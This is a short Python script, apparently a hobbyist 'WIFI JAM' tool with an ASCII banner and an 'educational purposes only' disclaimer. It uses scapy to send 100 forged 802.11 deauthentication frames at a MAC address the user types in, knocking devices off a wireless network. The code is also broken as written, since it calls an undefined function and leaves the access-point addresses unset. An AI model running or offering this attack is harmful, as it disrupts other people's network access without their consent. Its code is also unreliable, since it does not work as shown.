
from scapy.all import *
import os


# Create a banne NS HACK
print ("\033[92m")
print ("\033[92m")

def banner():
    os.system("clear ")
    print("""
████          ██     ██      ██        ██   ██████  ██████████      ██       ████████
████         ██     ██ ██     ██      ██    ██           ██        ██ ██     ██
██ ██       ██      ██  ██    ██      ██    ██           ██        ██  ██    ██
██  ██     ██      ██   ██     ██    ██     ████         ██       ██   ██    ███
██   ██    ██      ████████    ██    ██     ██           ██       ████████      ████
██    ██  ██      ██     ██     ██  ██      ██           ██      ██     ██         ██
██     ████       ██      ██    ██  ██      ██       █   ██      ██      ██        ██
██     ██        ██       ██      ██        ██████   ██████     ██       ██  ████████

""")

banner()
print ("\033[92m ")
print ("")
print ("_________________________________________________________________________________")
print ("|--------------------------- author :  NAVEJAS ----------------------------------| ")
print ("|-------------------------- TOOL NAME : WIFI JAM --------------------------------| ")
print ("|-------------------- THIS TOOL FOR ONLY EDUCATIONAL PURPOSES -------------------| ")
print ("— ————————————————————————————————————————————————————————————————————————————————")
print (" ")

print ("\033[92m")

print (" _______________________________________________________  ")
print ("|                 REQUIRED WIFI ADAPTER                 |     ")
print ("|_______________________________________________________| ")
print ("")
print ("\033[91m")
target_mac = input( " ENTER TAGET MAC ADDRESS : ")
interface = "wlan0"


def jam_wifi(mac):
    packet = RadioTap() / Dot11(addr1=mac, type=0, subtype=12) / Dot11Deauth()
    sendp(packet, iface="wlan0", count=100, inter=0.1)  # Adjust count and inter as needed

jam_wifi_network(target_mac, interface)
